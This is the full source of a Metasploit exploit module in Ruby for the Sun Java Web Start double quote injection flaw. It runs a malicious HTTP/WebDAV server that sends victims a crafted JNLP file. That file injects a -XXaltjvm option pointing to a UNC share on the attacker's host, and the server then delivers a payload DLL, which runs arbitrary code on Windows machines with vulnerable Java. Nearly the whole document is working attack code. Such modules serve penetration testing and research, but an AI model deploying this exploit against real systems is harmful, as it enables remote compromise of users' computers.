 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    #
    # This module acts as an HTTP server
    #
    include Msf::Exploit::Remote::HttpServer::HTML
    include Msf::Exploit::EXE
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Sun Java Web Start Double Quote Injection&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a flaw in the Web Start component of the Sun Java
                Runtime Environment. Parameters intial-heap-size and max-heap-size in a JNLP
                file can contain a double quote which is not properly sanitized when creating
                the command line for javaw.exe. This allows the injection of the -XXaltjvm
                option to load a jvm.dll from a remote UNC path into the java process. Thus 
                an attacker can execute arbitrary code in the context of a browser user.
                This flaw was fixed in Oct. 2012 and affects JRE <= 1.6.35 and <= 1.7.07.
 
                In order for this module to work, it must be ran as root on a server that
                does not serve SMB. Additionally, the target host must have the WebClient
                service (WebDAV Mini-Redirector) enabled. Alternatively an UNC path containing
                a jvm.dll can be specified with an own SMB server.
            },
            &#039;Author&#039;         => 
                [
                    # NOTE: module is completely based on and almost the same like jducks module for CVE-2012-0500 (Rev: 4369f73c)
                    &#039;Rh0 <rh0 () z1p dot biz>&#039;,   # discovery and msf module
                ],
            &#039;Version&#039;        => &#039;0.0&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;URL&#039;, &#039;http://dev.metasploit.com/redmine/projects/framework/repository/entry/modules/exploits/windows/browser/java_ws_vmargs.rb&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.oracle.com/technetwork/topics/security/javacpuoct2012-1515924.html&#039; ],
                ],
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;    => 1024,
                    &#039;BadChars&#039; => &#039;&#039;,
                    &#039;DisableNops&#039; => true,
                    &#039;PrependEncoder&#039; => "\x81\xc4\x54\xf2\xff\xff"
                },
            &#039;Targets&#039;        =>
                [
                    [ &#039;Automatic&#039;, { } ],
                    [ &#039;Java Runtime 1.6.31 to 1.6.35 and 1.7.03 to 1.7.07 on Windows x86&#039;,
                        {
                            &#039;Platform&#039; => &#039;win&#039;,
                            &#039;Arch&#039; => ARCH_X86
                        }
                    ],
                ],
            &#039;DefaultTarget&#039;  => 0,
            ))
 
        register_options(
            [
                OptPort.new(&#039;SRVPORT&#039;, [ true, "The daemon port to listen on", 80 ]),
                OptString.new(&#039;URIPATH&#039;, [ true, "The URI to use.", "/" ]),
                OptString.new(&#039;UNCPATH&#039;, [ false, &#039;Override the UNC path to use. (Use with a SMB server)&#039; ])
            ], self.class)
    end
 
 
    def auto_target(cli, request)
        agent = request.headers[&#039;User-Agent&#039;]
 
        ret = nil
        #print_status("Agent: #{agent}")
        # Check for MSIE and/or WebDAV redirector requests
        if agent =~ /(Windows NT (5|6)\.(0|1|2)|MiniRedir\/(5|6)\.(0|1|2))/
            ret = targets[1]
        elsif agent =~ /MSIE (6|7|8)\.0/
            ret = targets[1]
        else
            print_status("Unknown User-Agent #{agent} from #{cli.peerhost}:#{cli.peerport}")
        end
 
        ret
    end
 
 
    def on_request_uri(cli, request)
 
        # For this exploit, this does little besides ensures the user agent is a recognized one..
        mytarget = target
        if target.name == &#039;Automatic&#039;
            mytarget = auto_target(cli, request)
            if (not mytarget)
                send_not_found(cli)
                return
            end
        end
 
        # Special case to process OPTIONS for /
        if (request.method == &#039;OPTIONS&#039; and request.uri == &#039;/&#039;)
            process_options(cli, request, mytarget)
            return
        end
 
        # Discard requests for ico files
        if (request.uri =~ /\.ico$/i)
            send_not_found(cli)
            return
        end
 
        # If there is no subdirectory in the request, we need to redirect.
        if (request.uri == &#039;/&#039;) or not (request.uri =~ /\/([^\/]+)\//)
            if (request.uri == &#039;/&#039;)
                subdir = &#039;/&#039; + rand_text_alphanumeric(8+rand(8)) + &#039;/&#039;
            else
                subdir = request.uri + &#039;/&#039;
            end
            print_status("Request for \"#{request.uri}\" does not contain a sub-directory, redirecting to #{subdir} ...")
            send_redirect(cli, subdir)
            return
        else
            share_name = $1
        end
 
        # dispatch WebDAV requests based on method first
        case request.method
        when &#039;OPTIONS&#039;
            process_options(cli, request, mytarget)
 
        when &#039;PROPFIND&#039;
            process_propfind(cli, request, mytarget)
 
        when &#039;GET&#039;
            process_get(cli, request, mytarget, share_name)
 
        when &#039;PUT&#039;
            print_status("Sending 404 for PUT #{request.uri} ...")
            send_not_found(cli)
 
        else
            print_error("Unexpected request method encountered: #{request.method}")
 
        end
 
    end
 
    #
    # GET requests
    #
    def process_get(cli, request, target, share_name)
 
        print_status("Responding to \"GET #{request.uri}\" request from #{cli.peerhost}:#{cli.peerport}")
        # dispatch based on extension
        if (request.uri =~ /\.dll$/i)
            #
            # DLL requests sent by IE and the WebDav Mini-Redirector
            #
            print_status("Sending DLL to #{cli.peerhost}:#{cli.peerport}...")
 
            # Re-generate the payload
            return if ((p = regenerate_payload(cli)) == nil)
 
            # Generate a DLL based on the payload
            dll_data = generate_payload_dll({ :code => p.encoded })
 
            # Send it :)
            send_response(cli, dll_data, { &#039;Content-Type&#039; => &#039;application/octet-stream&#039; })
 
        elsif (request.uri =~ /\.jnlp$/i)
            #
            # Send the jnlp document
            #
 
            # Prepare the UNC path...
            if (datastore[&#039;UNCPATH&#039;])
                unc = datastore[&#039;UNCPATH&#039;].dup
            else
                my_host = (datastore[&#039;SRVHOST&#039;] == &#039;0.0.0.0&#039;) ? Rex::Socket.source_address(cli.peerhost) : datastore[&#039;SRVHOST&#039;]
                unc = "\\\\" + my_host + "\\" + share_name
            end
 
            # NOTE: we ensure there&#039;s only a single backslash here since it will get escaped
            if unc[0,2] == "\\\\"
                unc.slice!(0, 1)
            end
 
            http_agent = Rex::Text.rand_text_alpha(8+rand(8))
 
            # use initial-heap-size=&#039;"&#039; to inject a double quote and max-heap-size=" -XXaltjvm=\\IP\share " to
            # inject a parameter into the command line of javaw.exe
            jnlp_data = <<-EOS
<?xml version="1.0" encoding="UTF-8"?>
<jnlp version="1" codebase="#{Rex::Text.rand_text_alpha(rand(10)+10)}" href="#{Rex::Text.rand_text_alpha(rand(10)+10)}.jnlp">
<information>
   <title>#{Rex::Text.rand_text_alpha(rand(10)+10)}</title>
   <vendor>#{Rex::Text.rand_text_alpha(rand(10)+10)}</vendor>
   <description>#{Rex::Text.rand_text_alpha(rand(10)+10)}</description>
</information>
<resources>
   <java version="1.6+" initial-heap-size=&#039;"&#039; max-heap-size=" -XXaltjvm=#{unc} " />
</resources>
<application-desc progress-class="#{Rex::Text.rand_text_alpha(rand(10)+10)}" />
</jnlp>
EOS
            print_status("Sending JNLP to #{cli.peerhost}:#{cli.peerport}...")
 
 
            send_response(cli, jnlp_data, { &#039;Content-Type&#039; => &#039;application/x-java-jnlp-file&#039; })
 
        else
            print_status("Sending redirect to the JNLP file to #{cli.peerhost}:#{cli.peerport}")
            jnlp_name = Rex::Text.rand_text_alpha(8 + rand(8))
 
            jnlp_path = get_resource()
            if jnlp_path[-1,1] != &#039;/&#039;
                jnlp_path << &#039;/&#039;
            end
            jnlp_path << request.uri.split(&#039;/&#039;)[-1] << &#039;/&#039;
            jnlp_path << jnlp_name << ".jnlp"
 
            send_redirect(cli, jnlp_path, &#039;&#039;)
 
        end
 
    end
 
    #
    # OPTIONS requests sent by the WebDav Mini-Redirector
    #
    def process_options(cli, request, target)
        print_status("Responding to WebDAV \"OPTIONS #{request.uri}\" request from #{cli.peerhost}:#{cli.peerport}")
        headers = {
            #&#039;DASL&#039;   => &#039;<DAV:sql>&#039;,
            #&#039;DAV&#039;    => &#039;1, 2&#039;,
            &#039;Allow&#039;  => &#039;OPTIONS, GET, PROPFIND&#039;,
            &#039;Public&#039; => &#039;OPTIONS, GET, PROPFIND&#039;
        }
        send_response(cli, &#039;&#039;, headers)
    end
 
 
    #
    # PROPFIND requests sent by the WebDav Mini-Redirector
    #
    def process_propfind(cli, request, target)
        path = request.uri
        print_status("Received WebDAV \"PROPFIND #{request.uri}\" request from #{cli.peerhost}:#{cli.peerport}")
        body = &#039;&#039;
 
        if (path =~ /\.dll$/i)
            # Response for the DLL
            print_status("Sending DLL multistatus for #{path} ...")
#<lp1:getcontentlength>45056</lp1:getcontentlength>
            body = %Q|<?xml version="1.0" encoding="utf-8"?>
<D:multistatus xmlns:D="DAV:">
<D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
<D:href>#{path}</D:href>
<D:propstat>
<D:prop>
<lp1:resourcetype/>
<lp1:creationdate>2010-02-26T17:07:12Z</lp1:creationdate>
<lp1:getlastmodified>Fri, 26 Feb 2010 17:07:12 GMT</lp1:getlastmodified>
<lp1:getetag>"39e0132-b000-43c6e5f8d2f80"</lp1:getetag>
<lp2:executable>F</lp2:executable>
<D:lockdiscovery/>
<D:getcontenttype>application/octet-stream</D:getcontenttype>
</D:prop>
<D:status>HTTP/1.1 200 OK</D:status>
</D:propstat>
</D:response>
</D:multistatus>
|
 
        elsif (path =~ /\/$/) or (not path.sub(&#039;/&#039;, &#039;&#039;).index(&#039;/&#039;))
            # Response for anything else (generally just /)
            print_status("Sending directory multistatus for #{path} ...")
            body = %Q|<?xml version="1.0" encoding="utf-8"?>
<D:multistatus xmlns:D="DAV:">
<D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
<D:href>#{path}</D:href>
<D:propstat>
<D:prop>
<lp1:resourcetype><D:collection/></lp1:resourcetype>
<lp1:creationdate>2010-02-26T17:07:12Z</lp1:creationdate>
<lp1:getlastmodified>Fri, 26 Feb 2010 17:07:12 GMT</lp1:getlastmodified>
<lp1:getetag>"39e0001-1000-4808c3ec95000"</lp1:getetag>
<D:lockdiscovery/>
<D:getcontenttype>httpd/unix-directory</D:getcontenttype>
</D:prop>
<D:status>HTTP/1.1 200 OK</D:status>
</D:propstat>
</D:response>
</D:multistatus>
|
 
        else
            print_status("Sending 404 for #{path} ...")
            send_not_found(cli)
            return
 
        end
 
        # send the response
        resp = create_response(207, "Multi-Status")
        resp.body = body
        resp[&#039;Content-Type&#039;] = &#039;text/xml&#039;
        cli.send_response(resp)
    end
 
 
    #
    # Make sure we&#039;re on the right port/path to support WebDAV
    #
    def exploit
        if !datastore[&#039;UNCPATH&#039;] && (datastore[&#039;SRVPORT&#039;].to_i != 80 || datastore[&#039;URIPATH&#039;] != &#039;/&#039;)
            raise RuntimeError, &#039;Using WebDAV requires SRVPORT=80 and URIPATH=/&#039;
        end
 
        super
    end
 
end

